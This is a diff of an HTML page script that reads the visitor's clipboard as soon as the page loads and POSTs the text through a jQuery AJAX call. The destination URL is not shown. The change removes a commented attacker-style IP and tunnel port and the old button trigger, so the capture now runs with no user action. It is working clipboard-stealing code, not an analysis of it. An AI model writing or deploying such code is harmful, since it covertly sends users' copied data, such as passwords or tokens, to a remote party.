@@ -6,7 +6,7 @@
 <BODY>
 <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
 <script>
-//https://159.89.214.31:serveo_port
+
 function post(dataclip){
 $.ajax({
     type: 'POST',
@@ -27,37 +27,8 @@ $.ajax({
   });
 };
 
-
-
-
-
-//const readBtn = document.querySelector('.read-btn');
-//const resultsEl = document.querySelector('.clipboard-results');
-
 navigator.clipboard.readText().then(text => document.querySelector(".clipboard-results").innerText = post(text));
-//readBtn.addEventListener('click', () => {
 
- // navigator.clipboard.readText()
-  //  .then(text => {
-  //   resultsEl.innerText = post(text);
-   // })
-
-  //  .catch(err => {
-  //    console.log('Something went wrong', err);
-  //  })
-
-//});
-
-
-
-</script>
-
-
-
-<script>
-//window.onload = function(){
-//  document.getElementById('clickButton').click();
-//}
 </script>
 
 </head>
